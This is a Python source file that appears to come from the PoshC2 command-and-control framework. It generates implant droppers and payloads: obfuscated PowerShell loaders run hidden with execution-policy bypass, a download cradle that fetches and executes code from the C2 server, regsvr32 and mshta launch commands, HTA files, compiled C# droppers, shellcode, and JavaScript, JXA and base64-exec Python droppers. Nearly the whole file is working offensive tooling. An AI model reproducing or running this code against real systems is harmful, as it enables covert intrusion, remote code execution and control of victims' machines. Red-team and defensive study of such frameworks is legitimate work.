from io import StringIO
import gzip, base64, subprocess, os, hashlib, shutil, re, donut, importlib
from enum import Enum

from subprocess import Popen
import time
from datetime import datetime
from urllib.parse import urlparse

from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, DefaultMigrationProcess, PayloadModulesDirectory
from poshc2.server.Config import PBindSecret as DefaultPBindSecret, PBindPipeName as DefaultPBindPipeName, PayloadDomainCheck as DefaultPayloadDomainCheck , StageRetries, StageRetriesInitialWait, StageRetriesLimit, FCommFileName as DefaultFCommFileName
from poshc2.Colours import Colours
from poshc2.Utils import gen_key, randomuri, formStr, offsetFinder, get_first_url, get_first_dfheader
from poshc2.server.database.DB import get_url_by_id, get_default_url_id, select_item, get_otherbeaconurls, get_killdate, get_defaultbeacon
from poshc2.server.Core import get_images


class PayloadType(Enum):
    Posh_v2 = "Posh_v2"
    Posh_v4 = "Posh_v4"
    PBind = "PBind_v4"
    Sharp = "Sharp_v4"
    PBindSharp = "PBindSharp_v4"
    FCommSharp = "FCommSharp_v4"


class Payloads(object):

    quickstart = None

    def __init__(self, KillDate, Key, Insecure, UserAgent, Referrer, ConnectURL, BaseDirectory, URLID=None, ImplantType="", PowerShellProxyCommand="", PBindPipeName=DefaultPBindPipeName, PBindSecret=DefaultPBindSecret, PayloadDomainCheck=DefaultPayloadDomainCheck, FCommFileName=DefaultFCommFileName):

        if not URLID:
            URLID = get_default_url_id()

        self.URLID = URLID
        urlDetails = get_url_by_id(self.URLID)
        self.KillDate = KillDate
        self.Key = Key
        self.QuickCommand = select_item("QuickCommand", "C2Server")
        self.FirstURL = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
        self.PayloadCommsHost = urlDetails[2]
        self.DomainFrontHeader = urlDetails[3]
        self.Proxyurl = urlDetails[4]
        self.Proxyuser = urlDetails[5]
        self.Proxypass = urlDetails[6]
        self.PowerShellProxyCommand = PowerShellProxyCommand
        self.ImplantType = ImplantType
        self.Insecure = Insecure
        self.UserAgent = UserAgent
        self.Referrer = Referrer
        self.ConnectURL = ConnectURL
        self.BaseDirectory = BaseDirectory
        self.PBindPipeName = PBindPipeName
        self.PBindSecret = PBindSecret
        self.PayloadDomainCheck = PayloadDomainCheck
        self.FCommFileName = FCommFileName if FCommFileName else DefaultFCommFileName
        self.BaseDirectory = BaseDirectory
        self.StageRetries = StageRetries
        self.StageRetriesLimit = StageRetriesLimit
        self.StageRetriesInitialWait = StageRetriesInitialWait
        self.PSDropper = ""
        self.PyDropper = ""
        self.AllBeaconURLs=get_otherbeaconurls()
        self.AllBeaconImages=get_images()
        self.KillDate=get_killdate()
        self.Sleep=get_defaultbeacon()

        if os.path.exists("%saes.py" % PayloadsDirectory):
            with open("%saes.py" % PayloadsDirectory, 'r') as f:
                content = f.read()
            m = re.search('#KEY(.+?)#KEY', content)
            if m:
                keyfound = m.group(1)
            self.PyDropperHash = hashlib.sha512(content.encode("utf-8")).hexdigest()
            self.PyDropperKey = keyfound
        else:
            self.PyDropperKey = str(gen_key().decode("utf-8"))
            randomkey = self.PyDropperKey
            with open("%saes.py" % PayloadTemplatesDirectory, 'r') as f:
                content = f.read()
            aespy = str(content).replace("#REPLACEKEY#", "#KEY%s#KEY" % randomkey)
            filename = "%saes.py" % (self.BaseDirectory)
            with open(filename, 'w') as f:
                f.write(aespy)
            self.PyDropperHash = hashlib.sha512((aespy).encode('utf-8')).hexdigest()

        with open("%sdropper.ps1" % PayloadTemplatesDirectory, 'r') as f:
            content = f.read()
        self.PSDropper = str(content) \
            .replace("#REPLACEINSECURE#", self.Insecure) \
            .replace("#REPLACEHOSTPORT#", self.PayloadCommsHost) \
            .replace("#REPLACECONNECTURL#", (self.ConnectURL + self.ImplantType)) \
            .replace("#REPLACEIMPTYPE#", self.PayloadCommsHost) \
            .replace("#REPLACEKILLDATE#", self.KillDate) \
            .replace("#REPLACEPROXYUSER#", self.Proxyuser) \
            .replace("#REPLACEPROXYPASS#", self.Proxypass) \
            .replace("#REPLACEPROXYURL#", self.Proxyurl) \
            .replace("#REPLACEPROXYCOMMAND#", self.PowerShellProxyCommand) \
            .replace("#REPLACEDOMAINFRONT#", self.DomainFrontHeader) \
            .replace("#REPLACECONNECT#", self.ConnectURL) \
            .replace("#REPLACEUSERAGENT#", self.UserAgent) \
            .replace("#REPLACEREFERER#", self.Referrer) \
            .replace("#REPLACEURLID#", str(self.URLID)) \
            .replace("#REPLACEKEY#", self.Key) \
            .replace("#REPLACEMEDOMAIN#", str(self.PayloadDomainCheck)) \
            .replace("#REPLACESTAGERRETRIESLIMIT#", str(self.StageRetriesLimit).lower()) \
            .replace("#REPLACESTAGERRETRIES#", str(self.StageRetries).lower()) \
            .replace("#REPLACESTAGERRETRIESWAIT#", str(self.StageRetriesInitialWait))

    def QuickstartLog(self, txt):
        if not self.quickstart:
            self.quickstart = ''
        print(Colours.GREEN + txt)
        self.quickstart += txt + '\n'

    def WriteQuickstart(self, path):
        with open(path, 'w') as f:
            f.write(self.quickstart + Colours.END)
            print("")
            print(Colours.END + 'Quickstart written to ' + path + Colours.GREEN)

    def CreateRawBase(self, full=False, name=""):
        out = StringIO()
        data = bytes(self.PSDropper, 'utf-8')
        out = gzip.compress(data)
        gzipdata = base64.b64encode(out).decode("utf-8")
        b64gzip = "IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
        encodedPayload = base64.b64encode(b64gzip.encode('UTF-16LE')).decode("utf-8")
        batfile = "powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % encodedPayload
        if full:
            return batfile
        else:
            return base64.b64encode(b64gzip.encode('UTF-16LE')).decode("utf-8")

    def CreateRaw(self, name=""):
        self.QuickstartLog("Raw Payload written to: %s%spayload.txt" % (self.BaseDirectory, name))

        out = StringIO()
        data = bytes(self.PSDropper, 'utf-8')
        out = gzip.compress(data)
        gzipdata = base64.b64encode(out).decode("utf-8")
        b64gzip = "IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata

        with open("%s%spayload.txt" % (self.BaseDirectory, name), 'w') as f:
            f.write(self.PSDropper)

        self.QuickstartLog("Batch Payload written to: %s%spayload.bat" % (self.BaseDirectory, name))

        encodedPayload = base64.b64encode(b64gzip.encode('UTF-16LE'))
        batfile = "powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % encodedPayload.decode("utf-8")

        with open("%s%spayload.bat" % (self.BaseDirectory, name), 'w') as f:
            f.write(batfile)

        if name == "":
            psuri = f"{self.FirstURL}/{self.QuickCommand}_rp"
            pscmd = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$MS=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('%s')));IEX $MS" % psuri
            psurienc = base64.b64encode(pscmd.encode('UTF-16LE'))
            self.QuickstartLog("\npowershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % psurienc.decode('UTF-8'))

    def CreateDroppers(self, name="", pbindOnly=False):
        if not pbindOnly:
            self.QuickstartLog(f"C# Powershell v2 EXE written to: {self.BaseDirectory}{name}dropper_cs_ps_v2.exe")
            self.QuickstartLog(f"C# Powershell v4 EXE written to: {self.BaseDirectory}{name}dropper_cs_ps_v4.exe")
            self.QuickstartLog(f"C# Dropper EXE written to: {self.BaseDirectory}{name}dropper_cs.exe")
            self.QuickstartLog(f"C# PBind Powershell v4 EXE written to: {self.BaseDirectory}{name}dropper_cs_ps_pbind_v4.exe")
            self.QuickstartLog(f"C# PBind Dropper EXE written to: {self.BaseDirectory}{name}pbind_cs.exe")
            self.QuickstartLog(f"C# FComm Dropper EXE written to: {self.BaseDirectory}{name}fcomm_cs.exe")
        else:
            self.QuickstartLog(f"C# PBind Powershell v4 EXE written to: {self.BaseDirectory}{name}dropper_cs_ps_pbind_v4.exe")
            self.QuickstartLog(f"C# PBind Dropper EXE written to: {self.BaseDirectory}{name}pbind_cs.exe")

        # Powershell (system.management.automation.dll) Dropper
        with open("%sSharp_Powershell_Runner.cs" % PayloadTemplatesDirectory, 'r') as f:
            content = f.read()

        with open("%spbind.ps1" % PayloadTemplatesDirectory, 'r') as f:
            pbind = f.read()
            pbind = str(pbind) \
                .replace("#REPLACEKEY#", self.Key) \
                .replace("#REPLACEPBINDPIPENAME#", self.PBindPipeName) \
                .replace("#REPLACEPBINDSECRET#", self.PBindSecret)
            pbind = base64.b64encode(pbind.encode("utf-8")).decode("utf-8")

        content = content.replace("#REPLACEME#", pbind)

        filename = "%s%sSharp_Posh_PBind_Stager.cs" % (self.BaseDirectory, name)
        with open(filename, 'w') as f:
            f.write(content)

        if not pbindOnly:
            with open("%sSharp_Powershell_Runner.cs" % PayloadTemplatesDirectory, 'r') as f:
                content = f.read()
            content = content.replace("#REPLACEME#", base64.b64encode((self.PSDropper).encode("utf-8")).decode("utf-8"))
            filename = "%s%sSharp_Posh_Stager.cs" % (self.BaseDirectory, name)
            with open(filename, 'w') as f:
                f.write(content)

        if not pbindOnly:
            subprocess.check_output("mono-csc %s%sSharp_Posh_PBind_Stager.cs -out:%s%sdropper_cs_ps_pbind_v4.exe -target:exe -sdk:4 -warn:1 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory), shell=True)
            subprocess.check_output("mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps_v2.exe -target:exe -sdk:2 -warn:1 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory), shell=True)
            subprocess.check_output("mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps_v4.exe -target:exe -sdk:4 -warn:1 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory), shell=True)
        else:
            subprocess.check_output("mono-csc %s%sSharp_Posh_PBind_Stager.cs -out:%s%sdropper_cs_ps_pbind_v4.exe -target:exe -sdk:4 -warn:1 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory), shell=True)

        # CSharp (clr.dll) Dropper
        if not pbindOnly:
            with open("%sdropper.cs" % PayloadTemplatesDirectory, 'r') as f:
                content = f.read()
            content = str(content) \
                .replace("#REPLACEKEY#", self.Key) \
                .replace("#REPLACEBASEURL#", self.PayloadCommsHost) \
                .replace("#REPLACESTARTURL#", (self.ConnectURL + "?c")) \
                .replace("#REPLACEKILLDATE#", self.KillDate) \
                .replace("#REPLACEDF#", self.DomainFrontHeader) \
                .replace("#REPLACEUSERAGENT#", self.UserAgent) \
                .replace("#REPLACEREFERER#", self.Referrer) \
                .replace("#REPLACEPROXYURL#", self.Proxyurl) \
                .replace("#REPLACEPROXYUSER#", self.Proxyuser) \
                .replace("#REPLACEPROXYPASSWORD#", self.Proxypass) \
                .replace("#REPLACEURLID#", str(self.URLID)) \
                .replace("#REPLACEMEDOMAIN#", str(self.PayloadDomainCheck)) \
                .replace("#REPLACEURLID#", str(self.URLID)) \
                .replace("#REPLACESTAGERRETRIESLIMIT#", str(self.StageRetriesLimit).lower()) \
                .replace("#REPLACESTAGERRETRIES#", str(self.StageRetries).lower()) \
                .replace("#REPLACESTAGERRETRIESWAIT#", str(self.StageRetriesInitialWait))

            with open("%s%sdropper.cs" % (self.BaseDirectory, name), 'w') as f:
                f.write(str(content))

            subprocess.check_output("mono-csc %s%sdropper.cs -out:%sdropper_cs.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)
            os.rename("%sdropper_cs.exe" % (self.BaseDirectory), "%s%sdropper_cs.exe" % (self.BaseDirectory, name))

        # PBind CSharp Dropper
        with open("%spbind.cs" % PayloadTemplatesDirectory, 'r') as f:
            content = f.read()
        content = str(content) \
            .replace("#REPLACEKEY#", self.Key) \
            .replace("#REPLACEPBINDPIPENAME#", self.PBindPipeName) \
            .replace("#REPLACEPBINDSECRET#", self.PBindSecret)

        with open("%s%spbind.cs" % (self.BaseDirectory, name), 'w') as f:
            f.write(str(content))

        subprocess.check_output("mono-csc %s%spbind.cs -out:%sPB.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)
        os.rename("%sPB.exe" % (self.BaseDirectory), "%s%spbind_cs.exe" % (self.BaseDirectory, name))

        # FComm CSharp Dropper
        if not pbindOnly:
            with open("%sfcomm.cs" % PayloadTemplatesDirectory, 'r') as f:
                content = f.read()

            content = str(content) \
                .replace("#REPLACEKEY#", self.Key) \
                .replace("#REPLACEFCOMMFILENAME#", self.FCommFileName)

            with open("%s%sfcomm.cs" % (self.BaseDirectory, name), 'w') as f:
                f.write(str(content))

            subprocess.check_output("mono-csc %s%sfcomm.cs -out:%sFC.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)
            os.rename("%sFC.exe" % (self.BaseDirectory), "%s%sfcomm_cs.exe" % (self.BaseDirectory, name))

            subprocess.check_output("mono-csc %s%sfcomm.cs -out:%sFC.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)
            os.rename("%sFC.exe" % (self.BaseDirectory), "%s%sfcomm_cs.exe" % (self.BaseDirectory, name))

    def PatchBytes(self, filename, dll, offset, payloadtype, name=""):
        filename = "%s%s" % (self.BaseDirectory, filename)
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(dll))
        srcfilename = ""
        patchlenbytes = 30000
        if payloadtype == PayloadType.Posh_v2:
            srcfilename = "%s%s%s" % (self.BaseDirectory, name, "dropper_cs_ps_v2.exe")

        elif payloadtype == PayloadType.Posh_v4:
            srcfilename = "%s%s%s" % (self.BaseDirectory, name, "dropper_cs_ps_v4.exe")

        elif payloadtype == PayloadType.Sharp:
            srcfilename = "%s%s%s" % (self.BaseDirectory, name, "dropper_cs.exe")

        elif payloadtype == PayloadType.PBind:
            srcfilename = "%s%s%s" % (self.BaseDirectory, name, "dropper_cs_ps_pbind_v4.exe")

        elif payloadtype == PayloadType.PBindSharp:
            srcfilename = "%s%s%s" % (self.BaseDirectory, name, "pbind_cs.exe")

        elif payloadtype == PayloadType.FCommSharp:
            srcfilename = "%s%s%s" % (self.BaseDirectory, name, "fcomm_cs.exe")

        with open(srcfilename, "rb") as f:
            dllbase64 = f.read()

        dllbase64 = base64.b64encode(dllbase64).decode("utf-8")
        patchlen = 30000 - len((dllbase64))
        patch = dllbase64
        patch2 = ""
        patch2 = patch2.ljust(patchlen, '\x00')
        patch3 = "%s%s" % (patch, patch2)

        with open(filename, "r+b") as f:
            f.seek(offset)
            f.write(bytes(patch3, 'UTF-8'))

        self.QuickstartLog("Payload written to: %s" % (filename))

    def CreateDll(self, DestinationFile, ResourceFile, payloadtype, name=""):
        with open(ResourceFile, 'r') as f:
            fileRead = f.read()
        self.PatchBytes(DestinationFile, fileRead, offsetFinder(ResourceFile), payloadtype, name)

    def CreateShellcodeFile(self, DestinationFile, DestinationFileB64, ResourceFile, payloadtype, name=""):
        with open(ResourceFile, 'r') as f:
            fileRead = f.read()
        self.PatchBytes(DestinationFile, fileRead, offsetFinder(ResourceFile), payloadtype, name)
        with open(f"{self.BaseDirectory}{DestinationFile}", 'rb') as binary:
            with open(f"{self.BaseDirectory}{DestinationFileB64}", 'wb') as b64:
                b64.write(base64.b64encode(binary.read()))

    def CreateDlls(self, name="", pbindOnly=False):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("C++ DLL that loads CLR v2.0.50727 or v4.0.30319 - DLL Export (VoidFunc):" + Colours.GREEN)
        if not pbindOnly:
            self.CreateDll(f"{name}Posh_v2_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v2_x86_dll.b64", PayloadType.Posh_v2, name)
            self.CreateDll(f"{name}Posh_v2_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v2_x64_dll.b64", PayloadType.Posh_v2, name)
            self.CreateDll(f"{name}Posh_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", PayloadType.Posh_v4, name)
            self.CreateDll(f"{name}Posh_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", PayloadType.Posh_v4, name)
            self.CreateDll(f"{name}Sharp_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", PayloadType.Sharp, name)
            self.CreateDll(f"{name}Sharp_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", PayloadType.Sharp, name)
            self.CreateDll(f"{name}PBind_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", PayloadType.PBind, name)
            self.CreateDll(f"{name}PBind_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", PayloadType.PBind, name)
            self.CreateDll(f"{name}PBindSharp_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", PayloadType.PBindSharp, name)
            self.CreateDll(f"{name}PBindSharp_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", PayloadType.PBindSharp, name)
            self.CreateDll(f"{name}FCommSharp_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", PayloadType.FCommSharp, name)
            self.CreateDll(f"{name}FCommSharp_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", PayloadType.FCommSharp, name)
        else:
            self.CreateDll(f"{name}PBind_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", PayloadType.PBind, name)
            self.CreateDll(f"{name}PBind_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", PayloadType.PBind, name)
            self.CreateDll(f"{name}PBindSharp_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", PayloadType.PBindSharp, name)
            self.CreateDll(f"{name}PBindSharp_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", PayloadType.PBindSharp, name)

    def CreateShellcode(self, name="", pbindOnly=False):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Shellcode that loads CLR v2.0.50727 or v4.0.30319:" + Colours.GREEN)
        if not pbindOnly:
            self.CreateShellcodeFile(f"{name}Posh_v2_x86_Shellcode.bin", f"{name}Posh_v2_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v2_x86_Shellcode.b64", PayloadType.Posh_v2, name)
            self.CreateShellcodeFile(f"{name}Posh_v2_x64_Shellcode.bin", f"{name}Posh_v2_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v2_x64_Shellcode.b64", PayloadType.Posh_v2, name)
            self.CreateShellcodeFile(f"{name}Posh_v4_x86_Shellcode.bin", f"{name}Posh_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", PayloadType.Posh_v4, name)
            self.CreateShellcodeFile(f"{name}Posh_v4_x64_Shellcode.bin", f"{name}Posh_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", PayloadType.Posh_v4, name)
            self.CreateShellcodeFile(f"{name}Sharp_v4_x86_Shellcode.bin", f"{name}Sharp_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", PayloadType.Sharp, name)
            self.CreateShellcodeFile(f"{name}Sharp_v4_x64_Shellcode.bin", f"{name}Sharp_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", PayloadType.Sharp, name)
            self.CreateShellcodeFile(f"{name}PBind_v4_x86_Shellcode.bin", f"{name}PBind_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", PayloadType.PBind, name)
            self.CreateShellcodeFile(f"{name}PBind_v4_x64_Shellcode.bin", f"{name}PBind_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", PayloadType.PBind, name)
            self.CreateShellcodeFile(f"{name}PBindSharp_v4_x86_Shellcode.bin", f"{name}PBindSharp_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", PayloadType.PBindSharp, name)
            self.CreateShellcodeFile(f"{name}PBindSharp_v4_x64_Shellcode.bin", f"{name}PBindSharp_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", PayloadType.PBindSharp, name)
            self.CreateShellcodeFile(f"{name}FCommSharp_v4_x86_Shellcode.bin", f"{name}FCommSharp_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", PayloadType.FCommSharp, name)
            self.CreateShellcodeFile(f"{name}FCommSharp_v4_x64_Shellcode.bin", f"{name}FCommSharp_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", PayloadType.FCommSharp, name)
        else:
            self.CreateShellcodeFile(f"{name}PBind_v4_x86_Shellcode.bin", f"{name}PBind_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", PayloadType.PBind, name)
            self.CreateShellcodeFile(f"{name}PBind_v4_x64_Shellcode.bin", f"{name}PBind_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", PayloadType.PBind, name)
            self.CreateShellcodeFile(f"{name}PBindSharp_v4_x86_Shellcode.bin", f"{name}PBindSharp_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", PayloadType.PBindSharp, name)
            self.CreateShellcodeFile(f"{name}PBindSharp_v4_x64_Shellcode.bin", f"{name}PBindSharp_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", PayloadType.PBindSharp, name)

    def CreateSCT(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("regsvr32 /s /n /u /i:%s scrobj.dll" % f"{self.FirstURL}/{self.QuickCommand}_rg")
        with open("%sdropper_rg.sct" % (PayloadTemplatesDirectory), 'r') as f:
            content = f.read()
        content = str(content) \
            .replace("#REPLACEME#", self.CreateRawBase())
        with open("%s%srg_sct.xml" % (self.BaseDirectory, name), 'w') as f:
            f.write(content)

        self.QuickstartLog(Colours.END)
        self.QuickstartLog("mshta.exe 'vbscript:GetObject(\"script:%s\")(window.close)'" % f"{self.FirstURL}/{self.QuickCommand}_cs")
        with open("%sdropper_cs.sct" % (PayloadTemplatesDirectory), 'r') as f:
            content = f.read()
        content = str(content) \
            .replace("#REPLACEME#", self.CreateRawBase())
        with open("%s%scs_sct.xml" % (self.BaseDirectory, name), 'w') as f:
            f.write(content)

    def CreateHTA(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("HTA Payload written to: %sLauncher.hta" % self.BaseDirectory)

        basefile = self.CreateRawBase(full=True)
        with open("%sdropper.hta" % (PayloadTemplatesDirectory), 'r') as f:
            hta = f.read()
        hta = str(hta) \
            .replace("#REPLACEME#", basefile)
        with open("%s%sLauncher.hta" % (self.BaseDirectory, name), 'w') as f:
            f.write(hta)

    def CreateDotNet2JS(self, name="", pbindOnly=False):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("DotNet2JS Payloads:")

        for Payload in PayloadType:
            if not pbindOnly:
                self.CreateDotNet2JSFiles(Payload, name)
            if pbindOnly and Payload in (PayloadType.PBind, PayloadType.PBindSharp):
                self.CreateDotNet2JSFiles(Payload, name)

    def CreateDotNet2JSFiles(self, payloadtype, name=""):
        self.QuickstartLog("Payload written to: %s%s%s_DotNet2JS.js" % (self.BaseDirectory, name, payloadtype.value))
        self.QuickstartLog("Payload written to: %s%s%s_DotNet2JS.b64" % (self.BaseDirectory, name, payloadtype.value))
        with open("%sDotNet2JS.js" % PayloadTemplatesDirectory, 'r') as f:
            dotnet = f.read()

        with open('%s%s%s_x64_Shellcode.b64' % (self.BaseDirectory, name, payloadtype.value), 'rb') as f:
            shellcode64 = f.read()
        with open('%s%s%s_x86_Shellcode.b64' % (self.BaseDirectory, name, payloadtype.value), 'rb') as f:
            shellcode32 = f.read()

        dotnet = dotnet \
            .replace("#REPLACEME32#", shellcode32.decode('utf-8'))  \
            .replace("#REPLACEME64#", shellcode64.decode('utf-8'))

        filename = "%s%s%s_DotNet2JS.js" % (self.BaseDirectory, name, payloadtype.value)
        with open(filename, 'w') as f:
            f.write(dotnet)

        filename = "%s%s%s_DotNet2JS.b64" % (self.BaseDirectory, name, payloadtype.value)
        with open(filename, 'w') as f:
            f.write(base64.b64encode(dotnet.encode('UTF-8')).decode('utf-8'))

    def CreateJXA(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("macOS JXA Dropper written to: %sdropper_jxa.js" % self.BaseDirectory)

        # get the JXA dropper template
        with open("%sdropper_jxa.js" % PayloadTemplatesDirectory, 'r') as f:
            dropper_file = f.read()

        # patch the key settings into the file
        self.JXADropper = str(dropper_file) \
            .replace("#REPLACEKILLDATE#", self.KillDate) \
            .replace("#REPLACEKEY#", self.Key) \
            .replace("#REPLACEHOSTPORT#", self.PayloadCommsHost) \
            .replace("#REPLACEQUICKCOMMAND#", "/" + self.QuickCommand + "_jxa") \
            .replace("#REPLACECONNECTURL#", self.ConnectURL + "?j") \
            .replace("#REPLACEDOMAINFRONT#", self.DomainFrontHeader) \
            .replace("#REPLACEREFERER#", self.Referrer) \
            .replace("#REPLACEPROXYURL#", self.Proxyurl) \
            .replace("#REPLACEPROXYUSER#", self.Proxyuser) \
            .replace("#REPLACEPROXYPASSWORD#", self.Proxypass) \
            .replace("#REPLACEURLID#", str(self.URLID)) \
            .replace("#REPLACEUSERAGENT#", self.UserAgent) \
            .replace("#REPLACESTAGERRETRIESLIMIT#", str(self.StageRetriesLimit).lower()) \
            .replace("#REPLACESTAGERRETRIES#", str(self.StageRetries).lower()) \
            .replace("#REPLACESTAGERRETRIESWAIT#", str(self.StageRetriesInitialWait)) \
            .replace("#REPLACEIMPTYPE#", self.PayloadCommsHost)

        jxa = self.JXADropper.encode('UTF-8')
        jxadropper = jxa.decode('UTF-8')
        with open("%s%sdropper_jxa.js" % (self.BaseDirectory, name), 'w') as f:
            f.write(jxadropper)

    def CreatePython(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Python2 OSX/Unix/Win Dropper written to: %spy_dropper.sh" % self.BaseDirectory)

        # get the python dropper template
        with open("%sdropper.py" % PayloadTemplatesDirectory, 'r') as f:
            dropper_file = f.read()

        # patch the key settings into the file
        self.PyDropper = str(dropper_file) \
            .replace("#REPLACEKILLDATE#", self.KillDate) \
            .replace("#REPLACEPYTHONHASH#", self.PyDropperHash) \
            .replace("#REPLACESPYTHONKEY#", self.PyDropperKey) \
            .replace("#REPLACEKEY#", self.Key) \
            .replace("#REPLACEHOSTPORT#", self.PayloadCommsHost) \
            .replace("#REPLACEQUICKCOMMAND#", "/" + self.QuickCommand + "_py") \
            .replace("#REPLACECONNECTURL#", self.ConnectURL + "?m") \
            .replace("#REPLACEDOMAINFRONT#", self.DomainFrontHeader) \
            .replace("#REPLACEURLID#", str(self.URLID)) \
            .replace("#REPLACEUSERAGENT#", self.UserAgent)

        py = base64.b64encode(self.PyDropper.encode('UTF-8'))
        pydropper = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python2 &" % (py).decode('UTF-8')
        with open("%s%spy_dropper.sh" % (self.BaseDirectory, name), 'w') as f:
            f.write(pydropper)

        pydropper = "import sys,base64;exec(base64.b64decode('%s'));" % py.decode('UTF-8')
        with open("%s%spy_dropper.py" % (self.BaseDirectory, name), 'w') as f:
            f.write(pydropper)

    def CreateEXE(self, name="", pbindOnly=False):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Executable files:")

        for cfile in os.listdir(PayloadTemplatesDirectory):
            if cfile.endswith(".c"):
                for Payload in PayloadType:
                    if not pbindOnly:
                        self.CreateEXEFiles(cfile, Payload, name)
                    if pbindOnly and Payload in (PayloadType.PBind, PayloadType.PBindSharp):
                        self.CreateEXEFiles(cfile, Payload, name)

    def CreateEXEFiles(self, sourcefile, payloadtype, name=""):
        # Get the first URL and the default migration process from the config
        migrate_process = DefaultMigrationProcess
        if "\\" in migrate_process and "\\\\" not in migrate_process:
            migrate_process = migrate_process.replace("\\", "\\\\")

        if payloadtype == PayloadType.Posh_v2:
            # Get the Posh shellcode
            with open("%s%sPosh_v2_x86_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
                shellcodesrc = f.read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode32 = formStr("char sc[]", hexcode)
            with open("%s%sPosh_v2_x64_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
                shellcodesrc = f.read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode64 = formStr("char sc[]", hexcode)

        elif payloadtype == PayloadType.Posh_v4:
            # Get the Posh shellcode
            with open("%s%sPosh_v4_x86_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
                shellcodesrc = f.read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode32 = formStr("char sc[]", hexcode)
